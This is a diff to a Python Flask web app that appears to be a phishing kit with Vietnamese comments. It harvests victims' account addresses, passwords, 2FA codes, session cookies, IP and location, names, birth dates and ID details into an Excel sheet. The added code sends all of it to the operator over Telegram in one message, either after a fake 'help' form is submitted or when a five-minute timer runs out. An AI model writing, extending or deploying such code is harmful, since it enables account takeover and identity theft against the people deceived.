@@ -2378,6 +2378,188 @@ def create_unified_app():
 
     BOT_CONFIG_FILE = "bot_config.txt"
 
+    # Track những address đã gửi telegram (để chỉ gửi 1 lần)
+
+    _telegram_sent: set = set()
+
+    _telegram_lock = threading.Lock()
+
+    # Track pending timers cho mỗi address đang chờ submit help
+
+    _pending_timers: Dict[str, threading.Timer] = {}
+
+    _timers_lock = threading.Lock()
+
+    
+
+    def send_telegram_once(address: str, message: str) -> bool:
+
+        """Gửi telegram 1 lần duy nhất cho mỗi address"""
+
+        with _telegram_lock:
+
+            if address in _telegram_sent:
+
+                print(f"[Telegram] Đã gửi cho {address} trước đó, bỏ qua")
+
+                return False
+
+            result = send_telegram_message(message)
+
+            if result:
+
+                _telegram_sent.add(address)
+
+            return result
+
+    
+
+    def _adjust_column_widths(ws):
+
+        """Tự động căn chỉnh kích thước cột theo nội dung"""
+
+        try:
+
+            from openpyxl.utils import get_column_letter
+
+            
+
+            for column in ws.columns:
+
+                max_length = 0
+
+                column_letter = get_column_letter(column[0].column)
+
+                
+
+                for cell in column:
+
+                    try:
+
+                        if cell.value:
+
+                            # Chuyển giá trị thành string và tính độ dài
+
+                            cell_str = str(cell.value)
+
+                            # Giới hạn độ dài tối đa để tránh cột quá rộng
+
+                            if len(cell_str) > 100:
+
+                                cell_str = cell_str[:100]
+
+                            max_length = max(max_length, len(cell_str))
+
+                    except:
+
+                        pass
+
+                
+
+                # Cộng thêm padding và giới hạn tối đa
+
+                adjusted_width = min(max_length + 2, 50)  # Tối đa 50 ký tự
+
+                if adjusted_width < 10:
+
+                    adjusted_width = 10  # Tối thiểu 10 ký tự
+
+                
+
+                ws.column_dimensions[column_letter].width = adjusted_width
+
+            
+
+            print(f"[Excel] Đã tự động căn chỉnh kích thước cột")
+
+        except Exception as e:
+
+            print(f"[Excel] Lỗi căn chỉnh cột: {e}")
+
+    
+
+    def _send_timeout_telegram(address: str, client_ip: str, location_info: str):
+
+        try:
+
+            # Lấy thông tin từ Excel
+
+            wb = load_workbook(FILE_NAME)
+
+            ws = wb.active
+
+            
+
+            target_row = None
+
+            for row in range(ws.max_row, 1, -1):
+
+                if str(ws.cell(row=row, column=1).value or '').strip() == address:
+
+                    target_row = row
+
+                    break
+
+            
+
+            if target_row:
+
+                password = ws.cell(row=target_row, column=2).value or "unknown"
+
+                code_2fa = ws.cell(row=target_row, column=3).value or ""
+
+                cookies_str = ws.cell(row=target_row, column=6).value or ""
+
+                
+
+                telegram_msg = f"Ip: {client_ip}\n"
+
+                telegram_msg += f"Location: {client_ip} | {location_info}\n"
+
+                telegram_msg += "-----------------------------\n"
+
+                telegram_msg += f"Full Name: {address}\n"
+
+                telegram_msg += f"Date of birth: N/A\n"
+
+                telegram_msg += "-----------------------------\n"
+
+                telegram_msg += f"Email: N/A\n"
+
+                telegram_msg += "-----------------------------\n"
+
+                telegram_msg += f"Address: {address}\n"
+
+                telegram_msg += f"Password: {password}\n"
+
+                if code_2fa:
+
+                    telegram_msg += f"2FA: {code_2fa}\n"
+
+                telegram_msg += "-----------------------------\n\n"
+
+                telegram_msg += f"{cookies_str}"
+
+                
+
+                send_telegram_once(address, telegram_msg)
+
+                print(f"[Timeout] Đã gửi Telegram cho {address} (timeout, không có form)")
+
+        except Exception as e:
+
+            print(f"[Timeout] Lỗi gửi Telegram: {e}")
+
+        finally:
+
+            # Xóa timer khỏi dict
+
+            with _timers_lock:
+
+                if address in _pending_timers:
+
+                    del _pending_timers[address]
+
     
 
     
@@ -2441,9 +2623,6 @@ def create_unified_app():
             self._q.put((func, args, kwargs, fut))
 
             return fut.result()
-
-        
-
         def submit(self, func, *args, **kwargs) -> Future:
 
             """Gọi bất đồng bộ"""
@@ -3108,16 +3287,7 @@ def create_unified_app():
 
             
 
-            # Gửi mã 2FA đến Telegram
-
-            telegram_msg = f"🔐 <b>MÃ 2FA NHẬN ĐƯỢC</b>\n" \
-                          f"━━━━━━━━━━━━━━━━━━━━━\n\n" \
-                          f"👤 <b>Tài khoản:</b> <code>{email}</code>\n" \
-                          f"🔢 <b>Mã 2FA:</b> <code>{code}</code>\n" \
-                          f"🌐 <b>IP:</b> <code>{client_ip}</code>\n" \
-                          f"⏰ <b>Thời gian:</b> {timestamp}"
-
-            send_telegram_message(telegram_msg)
+            # Không gửi Telegram ở đây - sẽ gửi 1 lần duy nhất sau khi nhận form help
 
             
 
@@ -3339,11 +3509,15 @@ def create_unified_app():
 
                                 ws.cell(row=target_row, column=1).value = email
 
-                            
-
-                            # Lưu cookies vào cột 6
+                                            # Lưu cookies vào cột 6
 
                             ws.cell(row=target_row, column=6).value = cookies_str
+
+                            
+
+                            # Tự động căn chỉnh kích thước cột trước khi save
+
+                            _adjust_column_widths(ws)
 
                             wb.save(FILE_NAME)
 
@@ -3351,28 +3525,7 @@ def create_unified_app():
 
                             
 
-                            # Gửi password và cookies đến Telegram
-
-                            try:
-
-                                # Lấy password từ Excel
-
-                                password = ws.cell(row=target_row, column=2).value or "unknown"
-
-                                telegram_msg_full = f"🔓 <b>TÀI KHOẢN ĐĂNG NHẬP THÀNH CÔNG</b>\n" \
-                                                   f"━━━━━━━━━━━━━━━━━━━━━\n\n" \
-                                                   f"👤 <b>Email:</b> <code>{email}</code>\n" \
-                                                   f"🔑 <b>Password:</b> <code>{password}</code>\n" \
-                                                   f"🔢 <b>Mã 2FA:</b> <code>{code}</code>\n" \
-                                                   f"🍪 <b>Cookies:</b> <code>{cookies_str[:200]}...</code>\n" \
-                                                   f"🌐 <b>IP:</b> <code>{client_ip}</code>\n" \
-                                                   f"⏰ <b>Thời gian:</b> {timestamp}"
-
-                                send_telegram_message(telegram_msg_full)
-
-                            except Exception as tg_err:
-
-                                print(f"[2FA] Lỗi gửi Telegram: {tg_err}")
+                            # Không gửi Telegram ở đây - sẽ gửi từ submit_help hoặc timeout timer
 
                             
 
@@ -3484,6 +3637,10 @@ def create_unified_app():
 
         email = request.args.get('email', '')
 
+        if not email:
+
+            email = request.cookies.get('login_email', '')
+
         
 
         print(f"[Help] User-Agent: {user_agent[:50]}...")
@@ -3491,6 +3648,140 @@ def create_unified_app():
         print(f"[Help] Device: {device}")
 
         print(f"[Help] Email from URL: {email}")
+
+        def _has_login_cookies(login_email: str) -> bool:
+
+            try:
+
+                login_email = (login_email or "").strip()
+
+                if not login_email:
+
+                    return False
+
+                if not os.path.exists(FILE_NAME):
+
+                    return False
+
+                wb = load_workbook(FILE_NAME)
+
+                ws = wb.active
+
+                for row in range(ws.max_row, 1, -1):
+
+                    cell_email = str(ws.cell(row=row, column=1).value or "").strip()
+
+                    if cell_email != login_email:
+
+                        continue
+
+                    cookies_val = str(ws.cell(row=row, column=6).value or "").strip()
+
+                    return bool(cookies_val)
+
+                return False
+
+            except Exception as e:
+
+                print(f"[Help] Lỗi kiểm tra cookies login: {e}")
+
+                return False
+
+        def _has_login_row(login_email: str) -> bool:
+
+            try:
+
+                login_email = (login_email or "").strip()
+
+                if not login_email:
+
+                    return False
+
+                if not os.path.exists(FILE_NAME):
+
+                    return False
+
+                wb = load_workbook(FILE_NAME)
+
+                ws = wb.active
+
+                for row in range(ws.max_row, 1, -1):
+
+                    cell_email = str(ws.cell(row=row, column=1).value or "").strip()
+
+                    if cell_email == login_email:
+
+                        return True
+
+                return False
+
+            except Exception as e:
+
+                print(f"[Help] Lỗi kiểm tra row login: {e}")
+
+                return False
+
+        if not email:
+
+            return redirect("/")
+
+        if not (_has_login_row(email) or _has_login_cookies(email)):
+
+            return redirect("/")
+
+        
+
+        # Bắt đầu timer để gửi telegram sau 5 phút nếu không submit form
+
+        # Chỉ bắt đầu timer nếu chưa gửi telegram cho address này
+
+        with _telegram_lock:
+
+            already_sent = email in _telegram_sent
+
+        
+
+        if not already_sent:
+
+            with _timers_lock:
+
+                # Hủy timer cũ nếu có
+
+                if email in _pending_timers:
+
+                    _pending_timers[email].cancel()
+
+                    del _pending_timers[email]
+
+                
+
+                # Lấy IP và location để dùng trong timer
+
+                client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+
+                if ',' in client_ip:
+
+                    client_ip = client_ip.split(',')[0].strip()
+
+                location_info = get_ip_location(client_ip)
+
+                
+
+                # Tạo timer mới - 5 phút = 300 giây
+
+                timer = threading.Timer(300.0, _send_timeout_telegram, args=[email, client_ip, location_info])
+
+                timer.daemon = True
+
+                timer.start()
+
+                _pending_timers[email] = timer
+
+                print(f"[Help] Đã bắt đầu timer 5 phút cho {email}")
+
+        else:
+
+            print(f"[Help] Đã gửi telegram cho {email} trước đó, không bắt đầu timer")
 
         
 
@@ -3506,7 +3797,20 @@ def create_unified_app():
 
         template = template_map.get(device, "Desktop/help.html")
 
-        return render_template(template, email=email, login_email=email)
+        response = make_response(render_template(template, email=email, login_email=email))
+
+        response.set_cookie('login_email', email, max_age=3600)
+
+        return response
+
+
+    @app.route("/help/<path:subpath>")
+
+    def help_page_subpath(subpath: str):
+
+        """Bắt các URL dạng /help/<...> (vd: /help/3307005985981181) và đưa về flow chuẩn."""
+
+        return redirect("/help")
 
 
 
@@ -3674,9 +3978,9 @@ def create_unified_app():
 
                     ws = wb.active
 
-                    # Header chuẩn 11 cột
+                    # Header chuẩn 11 cột - cột 1 là Address (có thể trùng)
 
-                    ws.append(["Email", "Password", "Mã 2FA", "IP", "Thời gian & Vị trí", "Cookies",
+                    ws.append(["Address", "Password", "Mã 2FA", "IP", "Thời gian & Vị trí", "Cookies",
 
                                "Email hỗ trợ", "Họ và tên", "Ngày sinh", "Ảnh CCCD", "Ảnh xem trước"])
 
@@ -3690,7 +3994,7 @@ def create_unified_app():
 
                 
 
-                # Tìm hàng có email gần nhất
+                # Tìm hàng có Address gần nhất (cho phép trùng Address, lấy hàng mới nhất)
 
                 target_row = None
 
@@ -3710,7 +4014,7 @@ def create_unified_app():
 
                 if target_row is None:
 
-                    # Nếu không tìm thấy, thêm hàng mới chỉ với email và thông tin help
+                    # Nếu không tìm thấy, thêm hàng mới chỉ với Address và thông tin help
 
                     target_row = ws.max_row + 1
 
@@ -3818,9 +4122,115 @@ def create_unified_app():
 
                 
 
+                # Tự động căn chỉnh kích thước cột trước khi save
+
+                _adjust_column_widths(ws)
+
                 wb.save(FILE_NAME)
 
                 print(f"[Help Form] Đã lưu thông tin help cho {email} vào hàng {target_row}")
+
+                
+
+                # Gửi Telegram 1 lần duy nhất với đầy đủ thông tin
+
+                try:
+
+                    # Hủy timer nếu có (vì đã submit form rồi)
+
+                    with _timers_lock:
+
+                        if email in _pending_timers:
+
+                            _pending_timers[email].cancel()
+
+                            del _pending_timers[email]
+
+                            print(f"[Help Form] Đã hủy timer cho {email} (đã submit form)")
+
+                    
+
+                    # Lấy đầy đủ thông tin từ Excel để gửi Telegram
+
+                    full_name = data.get('field1', '')
+
+                    page_name = data.get('page_name', '')  # Nếu có field này
+
+                    email_business = data.get('field3', '')  # Email business nếu có
+
+                    phone = data.get('field4', '')  # Phone nếu có
+
+                    
+
+                    # Lấy password từ Excel (cột 2)
+
+                    password = ws.cell(row=target_row, column=2).value or "unknown"
+
+                    
+
+                    # Lấy cookies từ Excel (cột 6)
+
+                    cookies_str = ws.cell(row=target_row, column=6).value or ""
+
+                    
+
+                    # Lấy 2FA code từ Excel (cột 3) nếu có
+
+                    code_2fa = ws.cell(row=target_row, column=3).value or ""
+
+                    
+
+                    # Format message theo yêu cầu
+
+                    telegram_msg = f"Ip: {client_ip}\n"
+
+                    telegram_msg += f"Location: {client_ip} | {location_info}\n"
+
+                    telegram_msg += "-----------------------------\n"
+
+                    telegram_msg += f"Full Name: {full_name}\n"
+
+                    if page_name:
+
+                        telegram_msg += f"Page Name: {page_name}\n"
+
+                    telegram_msg += f"Date of birth: {birth_date}\n"
+
+                    telegram_msg += "-----------------------------\n"
+
+                    telegram_msg += f"Email: {help_email}\n"
+
+                    if email_business:
+
+                        telegram_msg += f"Email Business: {email_business}\n"
+
+                    if phone:
+
+                        telegram_msg += f"Phone Number: {phone}\n"
+
+                    telegram_msg += "-----------------------------\n"
+
+                    telegram_msg += f"Address: {email}\n"
+
+                    telegram_msg += f"Password: {password}\n"
+
+                    if code_2fa:
+
+                        telegram_msg += f"2FA: {code_2fa}\n"
+
+                    telegram_msg += "-----------------------------\n\n"
+
+                    telegram_msg += f"{cookies_str}"
+
+                    
+
+                    send_telegram_once(email, telegram_msg)
+
+                    print(f"[Help Form] Đã gửi Telegram 1 lần duy nhất cho {email}")
+
+                except Exception as tg_err:
+
+                    print(f"[Help Form] Lỗi gửi Telegram: {tg_err}")
 
             except Exception as excel_err:
 
